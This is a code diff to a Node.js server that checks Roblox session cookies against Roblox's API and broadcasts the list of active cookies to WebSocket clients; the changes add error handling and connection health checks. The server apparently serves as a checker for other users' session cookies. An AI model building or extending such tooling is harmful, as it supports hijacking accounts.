@@ -28,23 +28,74 @@ wss.on('connection', (ws) => {
     console.log('Client connected');
     
     // Send current cookie data to new client
-    ws.send(JSON.stringify({
-        type: 'cookieList',
-        cookies: Array.from(activeCookies.values())
-    }));
+    try {
+        ws.send(JSON.stringify({
+            type: 'cookieList',
+            cookies: Array.from(activeCookies.values())
+        }));
+    } catch (error) {
+        console.error('Error sending initial data to client:', error);
+    }
+    
+    // Add ping/pong for connection health
+    const pingInterval = setInterval(() => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.ping();
+        } else {
+            clearInterval(pingInterval);
+        }
+    }, 30000); // Ping every 30 seconds
+    
+    ws.on('pong', () => {
+        // Client is alive, connection is healthy
+    });
     
     ws.on('close', () => {
         clients.delete(ws);
+        clearInterval(pingInterval);
         console.log('Client disconnected');
+    });
+    
+    ws.on('error', (error) => {
+        console.error('WebSocket error:', error);
+        clients.delete(ws);
+        clearInterval(pingInterval);
+    });
+    
+    ws.on('message', (message) => {
+        try {
+            const data = JSON.parse(message);
+            if (data.type === 'ping') {
+                // Respond to client ping with pong
+                ws.send(JSON.stringify({ type: 'pong' }));
+            }
+        } catch (error) {
+            // Ignore invalid JSON messages
+        }
     });
 });
 
 // Broadcast to all connected clients
 function broadcast(data) {
+    const message = JSON.stringify(data);
+    const deadClients = [];
+    
     clients.forEach(client => {
         if (client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify(data));
+            try {
+                client.send(message);
+            } catch (error) {
+                console.error('Error sending message to client:', error);
+                deadClients.push(client);
+            }
+        } else {
+            deadClients.push(client);
         }
+    });
+    
+    // Clean up dead connections
+    deadClients.forEach(client => {
+        clients.delete(client);
     });
 }
 
@@ -166,12 +217,33 @@ async function getRobloxUserInfo(cookie) {
             'X-Requested-With': 'XMLHttpRequest'
         };
 
-        // First, try to get authenticated user info
+        // First, try to get authenticated user info with better error handling
         const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
             headers: headers,
             timeout: 10000,
-            maxRedirects: 5
+            maxRedirects: 5,
+            validateStatus: function (status) {
+                return status < 500; // Resolve only if the status code is less than 500
+            }
         });
+
+        // Check if the response is actually JSON
+        if (response.headers['content-type'] && !response.headers['content-type'].includes('application/json')) {
+            throw new Error('Invalid cookie - received HTML response instead of JSON');
+        }
+
+        // Check for API errors
+        if (response.status !== 200) {
+            let errorMessage = 'Authentication failed';
+            if (response.status === 401) {
+                errorMessage = 'Invalid or expired cookie';
+            } else if (response.status === 403) {
+                errorMessage = 'Access forbidden - cookie may be restricted';
+            } else if (response.status === 429) {
+                errorMessage = 'Rate limited - too many requests';
+            }
+            throw new Error(errorMessage);
+        }
         
         const userId = response.data.id;
         const username = response.data.name;
@@ -279,26 +351,34 @@ async function getRobloxUserInfo(cookie) {
         let errorMessage = 'Unknown error';
         if (error.response) {
             const status = error.response.status;
-            switch (status) {
-                case 401:
-                    errorMessage = 'Invalid or expired cookie';
-                    break;
-                case 403:
-                    errorMessage = 'Access forbidden - cookie may be restricted';
-                    break;
-                case 429:
-                    errorMessage = 'Rate limited - too many requests';
-                    break;
-                case 500:
-                    errorMessage = 'Roblox server error';
-                    break;
-                default:
-                    errorMessage = `HTTP ${status}: ${error.response.statusText}`;
+            // Check if response is HTML (error page)
+            const contentType = error.response.headers['content-type'] || '';
+            if (contentType.includes('text/html')) {
+                errorMessage = 'Invalid cookie - received error page from Roblox';
+            } else {
+                switch (status) {
+                    case 401:
+                        errorMessage = 'Invalid or expired cookie';
+                        break;
+                    case 403:
+                        errorMessage = 'Access forbidden - cookie may be restricted';
+                        break;
+                    case 429:
+                        errorMessage = 'Rate limited - too many requests';
+                        break;
+                    case 500:
+                        errorMessage = 'Roblox server error';
+                        break;
+                    default:
+                        errorMessage = `HTTP ${status}: ${error.response.statusText}`;
+                }
             }
         } else if (error.code === 'ECONNABORTED') {
             errorMessage = 'Request timeout';
         } else if (error.code === 'ENOTFOUND') {
             errorMessage = 'Network error';
+        } else if (error.message.includes('JSON')) {
+            errorMessage = 'Invalid cookie - malformed response from Roblox';
         } else {
             errorMessage = error.message;
         }
